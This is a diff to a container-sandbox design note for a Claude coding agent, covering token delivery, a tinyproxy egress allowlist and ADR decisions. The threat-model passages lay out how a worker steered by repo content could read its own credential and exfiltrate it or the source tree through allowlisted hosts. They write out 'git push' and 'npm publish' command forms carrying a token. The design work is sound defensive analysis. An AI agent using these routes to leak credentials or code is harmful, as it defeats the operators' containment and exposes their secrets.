@@ -115,13 +115,22 @@ Problems:
   files". Any container design breaks that, so the ADR must amend it.
 - The keychain access token expires: 5.5 h were left at launch. The refresh
   token must not go into the container. Rotating it there would log the
-  host out. The right token is a long-lived one from `claude setup-token`.
-  That needs one interactive operator step, and the token would be stored
+  host out. A long-lived one from `claude setup-token` avoids the expiry,
+  at the cost below. It needs one interactive operator step, and the token would be stored
   wherever pup keeps it.
 - The token is readable by anyone with docker access
-  (`docker inspect` shows `Config.Env`). The agent inside the container can
-  also read it from its own environment. Use a secret file, not `-e`, and
-  limit what that token can do.
+  (`docker inspect` shows `Config.Env`). A secret file instead of `-e`
+  closes that exposure, and only that one.
+- The agent inside the container can read the token too, and no delivery
+  method changes that. Claude must read the token to authenticate, and the
+  agent's Bash runs as the same `node` user in the same container. It can
+  `cat` a secret file as easily as it reads `/proc/self/environ` today.
+  While Claude runs inside the container that holds the credential, the
+  agent has the credential. A long-lived `setup-token` token makes that
+  worse, because a leaked copy stays useful for longer. The two ways out:
+  accept it and limit the token's scope and lifetime (rotation), or inject
+  the auth header outside the container (a host-side proxy to the model
+  API, so the container never holds the token).
 
 ### Dependencies: bit twice, both fixed in the image
 
@@ -216,7 +225,7 @@ that is about 6 at once. The slot lock needs to be held on the host: the
 shim's `test` call has to ask the host for a slot. Docker's `--cpus` limits
 one container; it does not coordinate across them.
 
-### Egress proxy: worked, with one real hole
+### Egress proxy: worked, with one real hole on every write-capable host
 
 From inside the worker:
 
@@ -234,17 +243,39 @@ The hole: the proxy sees only the CONNECT host name. Allowing `github.com`
 for fetch also allows `git push https://<someone's token>@github.com/…` to
 any repo, and `api.github.com` writes if that host is added later. "GitHub
 read" cannot be enforced without TLS interception. The worker does not need
-GitHub at all if the host provides the clone (see Working copy). Then the
-allowlist shrinks to the model API and npm, and that closes the hole.
+GitHub at all if the host provides the clone (see Working copy), so that
+host can go.
+
+That does not close the hole, because the same reasoning applies to
+`registry.npmjs.org`. `egress-allow.txt` allows it, and `tinyproxy.conf`
+runs with `FilterURLs Off` and `ConnectPort 443`, so any method and path to
+it passes. The worker runs `claude --dangerously-skip-permissions` with
+`npm` on its PATH and can read its own token (see Claude login). A worker
+steered by repo content or a dependency can run `npm publish
+--//registry.npmjs.org/:_authToken=<someone's token>` on a package that
+carries the token or the source tree, through the allowlist. Any
+allowlisted host that accepts authenticated writes is an exfiltration
+channel. The model API is one too, to whatever account the token belongs
+to. Closing npm needs either method and path filtering (TLS interception,
+GET-only on the registry) or no direct registry access (a host-side
+read-only mirror, or a pnpm store filled before the container starts, with
+npm off the allowlist).
 
 ## For the ADR
 
 Each item names what an ADR has to decide; none is decided here:
 
-- the token: amend decision 12, use `setup-token`, deliver it as a secret
-  file
-- the clone source: a host bundle (it fixes the base drift, the hooks and
-  the GitHub egress hole) or GitHub
+- the token: amend decision 12. While Claude runs in the container, the
+  agent has the token whatever the delivery; a secret file only hides it
+  from `docker inspect`. Either accept that and limit the token's scope and
+  lifetime (rotation, which argues against a long-lived `setup-token`), or
+  inject the auth header outside the container
+- the clone source: a host bundle (it fixes the base drift and the hooks,
+  and removes GitHub from the allowlist) or GitHub
+- the egress: any allowlisted host that accepts authenticated writes is an
+  exfiltration channel, npm included. Either filter method and path (TLS
+  interception) or drop direct registry access (a host-side read-only
+  mirror, or a pre-filled pnpm store)
 - the event channel: what replaces `state.db`, the hooks and the transcripts
   inside the container
 - the gate: make the suite Linux-clean, or keep macOS as the only full gate
